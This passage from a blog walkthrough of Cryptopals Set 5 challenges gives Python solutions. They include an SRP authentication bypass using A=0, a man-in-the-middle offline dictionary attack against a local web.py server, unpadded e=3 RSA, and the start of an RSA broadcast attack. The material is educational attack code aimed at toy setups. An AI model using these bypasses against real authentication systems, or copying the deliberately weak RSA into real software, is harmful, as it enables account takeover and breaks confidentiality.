<span style="color:#66d9ef">print</span>(json<span style="color:#f92672">.</span>loads(response2<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>)))
</code></pre></div><p><code>b&quot;{'name': 'Hello, World!'}&quot;</code><br>
<code>{'name': 'Hello, hexterisk!'}</code></p>
<p>The equation for the production of the server&rsquo;s session key <em>K</em> boils down to:</p>
<p><em>S = (A.vᵘ)ᵇ mod N</em></p>
<p><em>K = hash(S)</em></p>
<p>If A is zero, then S, and consequently K will be zero. We therefore need not know the password. </p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">implement_SRP_zero</span>() <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implement SRP(Secure Remote Password) for proposed &#34;A&#34; values.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># This loop goes over proposed values for &#34;A&#34; by the question.</span>
    <span style="color:#66d9ef">for</span> A <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0</span>, N, N<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]:
        a <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)

        response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/init?I=&#34;</span> <span style="color:#f92672">+</span> I <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;A=&#34;</span> <span style="color:#f92672">+</span> str(A))
        response_dict <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>))
        salt <span style="color:#f92672">=</span> response_dict[<span style="color:#e6db74">&#34;salt&#34;</span>]
        B <span style="color:#f92672">=</span> int(response_dict[<span style="color:#e6db74">&#34;B&#34;</span>])

        uH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(A)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>str(B)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
        u <span style="color:#f92672">=</span> int(uH, <span style="color:#ae81ff">16</span>)

        xH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>P<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
        x <span style="color:#f92672">=</span> int(xH, <span style="color:#ae81ff">16</span>)

        <span style="color:#75715e"># S = modular_pow((B - k * modular_pow(g, x, N)), (a + u * x), N)</span>
        <span style="color:#75715e"># We put S=0 because we know it&#39;s going to be zero on the server side</span>
        S <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()

        HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())

        response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/verify?hmac=&#34;</span> <span style="color:#f92672">+</span> hmac)
        <span style="color:#66d9ef">assert</span> response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;OK&#34;</span>
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Verification successful.&#34;</span>)
        <span style="color:#66d9ef">return</span> True
</code></pre></div><p><code>&gt; Verification successful.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-38-offline-dictionary-attack-on-simplified-srp">Challenge 38: Offline dictionary attack on simplified SRP</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/38">Link</a></p>
<blockquote>
<p>S **x = SHA256(salt|password)<br>
v = g**x % n<br>
C-&gt;S<br>
<strong>I, A = g**a % n</strong><br>
S-&gt;C<br>
<strong>salt, B = g**b % n, u = 128 bit random number</strong><br>
C<br>
<strong>x = SHA256(salt|password)</strong><br>
<strong>S = B**(a + ux) % n</strong><br>
<strong>K = SHA256(S)</strong><br>
S<br>
**S = (A * v ** u)<strong>b % n</strong><br>
<strong>K = SHA256(S)</strong><br>
C-&gt;S<br>
Send HMAC-SHA256(K, salt)<br>
S-&gt;C<br>
Send &ldquo;OK&rdquo; if HMAC-SHA256(K, salt) validates<br>
Note that in this protocol, the server&rsquo;s &ldquo;B&rdquo; parameter doesn&rsquo;t depend on the password (it&rsquo;s just a Diffie Hellman public key).<br>
Make sure the protocol works given a valid password.<br>
Now, run the protocol as a MITM attacker: pose as the server and use arbitrary values for b, B, u, and salt.<br>
Crack the password from A&rsquo;s HMAC-SHA256(K, salt).</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> web
<span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> hashlib
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Client and server agree on these values beforehand</span>

<span style="color:#75715e"># Generated using &#34;openssl dhparam -text 1024&#34;.</span>
N <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb9&#34;</span>
        <span style="color:#e6db74">&#34;18d30431fca1770760aa48be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e&#34;</span>
        <span style="color:#e6db74">&#34;01ac1fa9bdefd1f04f95f197b000486c43917568ff58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33&#34;</span>, <span style="color:#ae81ff">16</span>)
g <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
k <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
I <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hextersik@hexterisk.com&#34;</span>
P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BackupU$r&#34;</span>
</code></pre></div><p>I used web.py to build the server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">urls <span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#39;/hello&#39;</span>, <span style="color:#e6db74">&#39;Hello&#39;</span>,
    <span style="color:#e6db74">&#39;/init&#39;</span>, <span style="color:#e6db74">&#39;Initiate&#39;</span>,
    <span style="color:#e6db74">&#39;/verify&#39;</span>, <span style="color:#e6db74">&#39;Verify&#39;</span>
)

app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>application(urls, globals())

K <span style="color:#f92672">=</span> None
salt <span style="color:#f92672">=</span> str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
<span style="color:#75715e"># since we can&#39;t save x, xH</span>
v <span style="color:#f92672">=</span> pow(g, int(hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>P<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>), N)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>:        
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        name <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>name
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name:
            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;World&#39;</span>
            
        string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, &#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;name&#34;</span> : string}
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Verify</span>:

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        hmac_received <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>hmac
        
        HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())
        
        <span style="color:#66d9ef">if</span> hmac <span style="color:#f92672">==</span> hmac_received:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Initiate</span>:
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        I <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>I
        A <span style="color:#f92672">=</span> int(params<span style="color:#f92672">.</span>A)
        
        b <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
        B <span style="color:#f92672">=</span> pow(g, b, N)
        
        u <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">128</span>)
        S <span style="color:#f92672">=</span> pow(A <span style="color:#f92672">*</span> pow(v, u, N), b, N)
        K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
        
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;salt&#34;</span>:salt, <span style="color:#e6db74">&#34;B&#34;</span>:B, <span style="color:#e6db74">&#34;u&#34;</span>:u}
</code></pre></div><p>Test the web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">response1 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=&#34;</span>)
<span style="color:#66d9ef">print</span>(response1<span style="color:#f92672">.</span>data)

response2 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=hexterisk&#34;</span>)
<span style="color:#66d9ef">print</span>(json<span style="color:#f92672">.</span>loads(response2<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>)))
</code></pre></div><p><code>b&quot;{'name': 'Hello, World!'}&quot;</code><br>
<code>{'name': 'Hello, hexterisk!'}</code></p>
<p>The idea is that if you&rsquo;re able to get a MITM working, you can modify the parameters being exchanged. Therefore, you can use a dictionary attack to fetch a list of common passwords, use them to generate a session key <em>K</em>, and brute force the list of passwords in hopes of a successful verification.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">MITM_SRP</span>() <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implements simplified SRP and performs MITM.
</span><span style="color:#e6db74">    Performs an offline dictionary attack on it.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    a <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
    A <span style="color:#f92672">=</span> pow(g, a, N)
    
    response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/init?I=&#34;</span> <span style="color:#f92672">+</span> I <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;A=&#34;</span> <span style="color:#f92672">+</span> str(A))
    response_dict <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>))
    salt <span style="color:#f92672">=</span> response_dict[<span style="color:#e6db74">&#34;salt&#34;</span>]
    B <span style="color:#f92672">=</span> int(response_dict[<span style="color:#e6db74">&#34;B&#34;</span>])
    u <span style="color:#f92672">=</span> int(response_dict[<span style="color:#e6db74">&#34;u&#34;</span>])
    
    <span style="color:#75715e"># Uses a dictionary.</span>
    data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;dictionary.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()
    passwords <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
    
    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
        xH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
        x <span style="color:#f92672">=</span> int(xH, <span style="color:#ae81ff">16</span>)

        S <span style="color:#f92672">=</span> pow(B, (a <span style="color:#f92672">+</span> u <span style="color:#f92672">*</span> x), N)
        K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()

        HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())

        response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/verify?hmac=&#34;</span> <span style="color:#f92672">+</span> hmac)
        
        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;OK&#34;</span>:
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Brute force successful.&#34;</span>)
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Password found to be:&#34;</span>, P)
            <span style="color:#66d9ef">return</span> True
            <span style="color:#66d9ef">break</span>
</code></pre></div><p><code>&gt; Brute force successful.</code><br>
<code>&gt; Password found to be: BackupU$r</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-39-implement-rsa">Challenge 39: Implement RSA</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/39">Link</a></p>
<blockquote>
<p>There are two annoying things about implementing RSA. Both of them involve key generation; the actual encryption/decryption in RSA is trivial.<br>
First, you need to generate random primes. You can&rsquo;t just agree on a prime ahead of time, like you do in DH. You can write this algorithm yourself, but I just cheat and use OpenSSL&rsquo;s BN library to do the work.<br>
The second is that you need an &ldquo;invmod&rdquo; operation (the multiplicative inverse), which is not an operation that is wired into your language. The algorithm is just a couple lines, but I always lose an hour getting it to work.<br>
I recommend you not bother with primegen, but do take the time to get your own EGCD and invmod algorithm working.<br>
Now:</p>
<ol>
<li>Generate 2 random primes. We&rsquo;ll use small numbers to start, so you can just pick them out of a prime table. Call them &ldquo;p&rdquo; and &ldquo;q&rdquo;.</li>
<li>Let n be p * q. Your RSA math is modulo n.</li>
<li>Let et be (p-1)*(q-1) (the &ldquo;totient&rdquo;). You need this value only for keygen.</li>
<li>Let e be 3.</li>
<li>Compute d = invmod(e, et). invmod(17, 3120) is 2753.</li>
<li>Your public key is [e, n]. Your private key is [d, n].</li>
<li>To encrypt: c = m<strong>e%n. To decrypt: m = c</strong>d%n</li>
<li>Test this out with a number, like &ldquo;42&rdquo;.</li>
<li>Repeat with bignum primes (keep e=3).</li>
</ol>
<p>Finally, to encrypt a string, do something cheesy, like convert the string to hex and put &ldquo;0x&rdquo; on the front of it to turn it into a number. The math cares not how stupidly you feed it strings.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> math
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> getPrime
</code></pre></div><p>I used <a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm">Extended Euclidean Algorithm</a> to calculate the modular inverse.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mod_inverse</span>(a: int, n: int) <span style="color:#f92672">-&gt;</span> int: 
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Computes the multiplicative inverse of a modulo n using the extended Euclidean algorithm.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    t, r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, n
    new_t, new_r <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, a

    <span style="color:#66d9ef">while</span> new_r <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
        quotient <span style="color:#f92672">=</span> r <span style="color:#f92672">//</span> new_r
        t, new_t <span style="color:#f92672">=</span> new_t, t <span style="color:#f92672">-</span> quotient <span style="color:#f92672">*</span> new_t
        r, new_r <span style="color:#f92672">=</span> new_r, r <span style="color:#f92672">-</span> quotient <span style="color:#f92672">*</span> new_r

    <span style="color:#66d9ef">if</span> r <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;a is not invertible&#34;</span>)
    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
        t <span style="color:#f92672">=</span> t <span style="color:#f92672">+</span> n

    <span style="color:#66d9ef">return</span> t
</code></pre></div><p><a href="https://simple.wikipedia.org/wiki/RSA_algorithm">RSA</a> (<strong>Rivest–Shamir–Adleman</strong>) is based on the difficulty of factoring large numbers. It uses two large primes <em>p</em> and <em>q</em>, used to calculate the following parameters:</p>
<ul>
<li>_n = p * q _</li>
<li>ϕ(n) = (p - 1) * (q - 1), called <strong>totient</strong>.</li>
<li><em>e</em> is a value co-prime to <em>n</em>.</li>
<li><em>d</em> <em>= 1 mod ϕ(n)</em></li>
</ul>
<p>The public key is the pair (e, n) and the private key is the pair (d, n).</p>
<p>For a message <em>M,</em> convert it into integral form <em>m</em>. Then:</p>
<ul>
<li>Encryption: c = mᵉ mod n</li>
<li>Decryption: m = cᵈ mod n</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RSA</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implementation of the RSA (Rivest–Shamir–Adleman) algorithm.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#66d9ef">def</span> __init__(self: object, keysize: int):
        e <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
        et <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

        <span style="color:#66d9ef">while</span> math<span style="color:#f92672">.</span>gcd(e, et) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
            p, q <span style="color:#f92672">=</span> getPrime(keysize <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>), getPrime(keysize <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>)
            et <span style="color:#f92672">=</span> ((p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">//</span> math<span style="color:#f92672">.</span>gcd(p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
            n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q

        d <span style="color:#f92672">=</span> mod_inverse(e, et)
        
        self<span style="color:#f92672">.</span>pub <span style="color:#f92672">=</span> (e, n)
        self<span style="color:#f92672">.</span>pvt <span style="color:#f92672">=</span> (d, n)

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(self: object, message: bytes, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#f92672">-&gt;</span> int:
        (e, n) <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pub
        data <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(message, byteorder)
        
        <span style="color:#66d9ef">if</span> data <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> data <span style="color:#f92672">&gt;=</span> n:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(data) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; out of range&#39;</span>)
            
        <span style="color:#66d9ef">return</span> pow(data, e, n)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptnum</span>(self: object, m: int) <span style="color:#f92672">-&gt;</span> int:
        (e, n) <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pub
        <span style="color:#66d9ef">if</span> m <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> m <span style="color:#f92672">&gt;=</span> n:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(m) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; out of range&#39;</span>)
        <span style="color:#66d9ef">return</span> pow(m, e, n)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self: object, ciphertext: bytes, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#f92672">-&gt;</span> bytes:
        (d, n) <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pvt
        
        <span style="color:#66d9ef">if</span> ciphertext <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> ciphertext <span style="color:#f92672">&gt;=</span> n:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(ciphertext) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; out of range&#39;</span>)
        
        numeric_plain <span style="color:#f92672">=</span> pow(ciphertext, d, n)
        <span style="color:#66d9ef">return</span> numeric_plain<span style="color:#f92672">.</span>to_bytes((numeric_plain<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, byteorder)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryptnum</span>(self: object, m: int) <span style="color:#f92672">-&gt;</span> int:
        (d, n) <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pvt
        <span style="color:#66d9ef">if</span> m <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> m <span style="color:#f92672">&gt;=</span> n:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(m) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; out of range&#39;</span>)
        <span style="color:#66d9ef">return</span> pow(m, d, n)

rsa <span style="color:#f92672">=</span> RSA(<span style="color:#ae81ff">1024</span>)
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Testing 1..2..3...&#34;</span>
ciphertext <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encrypt(message<span style="color:#f92672">.</span>encode())
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-40-implement-an-e3-rsa-broadcast-attack">Challenge 40: Implement an E=3 RSA Broadcast attack</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/40">Link</a></p>
<blockquote>
<p>Assume you&rsquo;re a Javascript programmer. That is, you&rsquo;re using a naive handrolled RSA to encrypt without padding.<br>
Assume you can be coerced into encrypting the same plaintext three times, under three different public keys. You can; it&rsquo;s happened.<br>
Then an attacker can trivially decrypt your message, by:<br>
Capturing any 3 of the ciphertexts and their corresponding pubkeys<br>
Using the CRT to solve for the number represented by the three ciphertexts (which are residues mod their respective pubkeys)<br>
Taking the cube root of the resulting number<br>
The CRT says you can take any number and represent it as the combination of a series of residues mod a series of moduli. In the three-residue case, you have: <strong>result =</strong><br>
<strong>(c_0 * m_s_0 * invmod(m_s_0, n_0)) +</strong><br>
<strong>(c_1 * m_s_1 * invmod(m_s_1, n_1)) +</strong><br>
<strong>(c_2 * m_s_2 * invmod(m_s_2, n_2)) mod N_012</strong><br>
where:<br>
<strong>c_0, c_1, c_2 are the three respective residues mod</strong><br>
<strong>n_0, n_1, n_2</strong><br>
<strong>m_s_n (for n in 0, 1, 2) are the product of the moduli</strong><br>
<strong>EXCEPT n_n &mdash; ie, m_s_1 is n_0 * n_2</strong><br>
<strong>N_012 is the product of all three moduli</strong><br>
To decrypt RSA using a simple cube root, leave off the final modulus operation; just take the raw accumulated result and cube-root it.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># Imports</span>
    <span style="color:#f92672">import</span> math
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">floorRoot</span>(n: int, s: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Finds the specified powered root of an integer and returns the resulting float&#39;s floor value.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    b <span style="color:#f92672">=</span> n<span style="color:#f92672">.</span>bit_length()
    p <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>ceil(b<span style="color:#f92672">/</span>s)
    x <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>p
    <span style="color:#66d9ef">while</span> x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
        y <span style="color:#f92672">=</span> (((s <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> x) <span style="color:#f92672">+</span> (n <span style="color:#f92672">//</span> (x<span style="color:#f92672">**</span>(s<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">//</span> s
        <span style="color:#66d9ef">if</span> y <span style="color:#f92672">&gt;=</span> x:
            <span style="color:#66d9ef">return</span> x
        x <span style="color:#f92672">=</span> y
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
</code></pre></div><p>NOTE: The attack only works if the RSA public key <em>e</em> is very small( say, equal to 3).</p>
